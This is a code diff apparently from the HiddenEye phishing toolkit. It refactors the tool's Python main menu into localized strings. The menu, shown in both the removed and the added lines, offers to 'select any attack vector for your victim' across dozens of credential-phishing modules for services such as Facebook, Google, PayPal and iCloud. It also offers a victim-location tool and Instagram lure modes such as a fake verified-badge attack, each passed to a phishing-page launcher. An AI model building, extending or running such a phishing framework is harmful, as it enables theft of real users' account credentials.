@@ -21,69 +21,65 @@ def start_main_menu():
     print(localization.lang_start_main_menu["short_description"])
     print(localization.lang_start_main_menu["features_summary"])
     print(localization.lang_start_main_menu["down_line"])
-    print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------")
-    print("\n{0}PHISHING-MODULES:".format(default_palette[0]))
-    print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(default_palette[0], default_palette[2]))
-    print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
-        default_palette[0], default_palette[2]))
-    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
-        default_palette[0], default_palette[2]))
-    print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(default_palette[0]))
-    print(" {0}[{1}A{0}]{1} Get Victim Location".format(default_palette[0], default_palette[2]))
+    print(localization.lang_start_main_menu["attack_vector_message"])
+    print(localization.lang_start_main_menu["phishing_modules_header"])
 
-    option = input("\n{0}HiddenEye >>>  {1}".format(default_palette[0], default_palette[2]))
-    if option == '1' or option == '01':
+    #phishing_col_width = max(len(word) for row in phishing_modules_list for word in row) + 2
+    #for row in phishing_modules_list:
+        #print("".join(word.ljust(phishing_col_width) for word in row).format(default_palette[0], default_palette[2]))                         
+    print_sorted_as_menu(localization.lang_start_main_menu["phishing_modules_list"])
+    print(localization.lang_start_main_menu["additional_modules"])
+    
+    #additional_col_width = max(len(word) for row in additional_modules_list for word in row) + 2
+    #for row in additional_modules_list:
+        #print("".join(word.ljust(additional_col_width) for word in row).format(default_palette[0], default_palette[2]))
+    print_sorted_as_menu(localization.lang_start_main_menu["additional_modules_list"])
+
+    option = input(global_localization.input_line)
+    option = option.zfill(2)
+    if option == '01':
         module_loading_message('Facebook')
-        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        #customOption = input("\nOperation mode:\n {0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        print(localization.lang_start_main_menu["operation_mode"])
+        print_sorted_as_menu(localization.lang_start_main_menu["facebook_operation_modes"])
+        customOption = input(global_localization.input_line)
         start_phishing_page('Facebook', customOption)
-    elif option == '2' or option == '02':
+    elif option == '02':
         module_loading_message('Google')
-        customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        print(localization.lang_start_main_menu["operation_mode"])
+        print_sorted_as_menu(localization.lang_start_main_menu["google_operation_modes"])
+        #customOption = input(
+        #\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        customOption = input(global_localization.input_line)
         start_phishing_page('Google', customOption)
-    elif option == '3' or option == '03':
+    elif option == '03':
         module_loading_message('LinkedIn')
         customOption = ''
         start_phishing_page('LinkedIn', customOption)
-    elif option == '4' or option == '04':
+    elif option == '04':
         module_loading_message('GitHub')
         customOption = ''
         start_phishing_page('GitHub', customOption)
-    elif option == '5' or option == '05':
+    elif option == '05':
         module_loading_message('StackOverflow')
         customOption = ''
         start_phishing_page('StackOverflow', customOption)
-    elif option == '6' or option == '06':
+    elif option == '06':
         module_loading_message('WordPress')
         customOption = ''
         start_phishing_page('WordPress', customOption)
-    elif option == '7' or option == '07':
+    elif option == '07':
         module_loading_message('Twitter')
         customOption = ''
         start_phishing_page('Twitter', customOption)
-    elif option == '8' or option == '08':
+    elif option == '08':
         module_loading_message('Instagram')
-        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        #customOption = input("\nOperation mode:\n n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+        print(localization.lang_start_main_menu["operation_mode"])
+        print_sorted_as_menu(localization.lang_start_main_menu["instagram_operation_modes"])
+        customOption = input(global_localization.input_line)
         start_phishing_page('Instagram', customOption)
-    elif option == '9' or option == '09':
+    elif option == '09':
         module_loading_message('Snapchat')
         customOption = ''
         start_phishing_page('Snapchat', customOption)
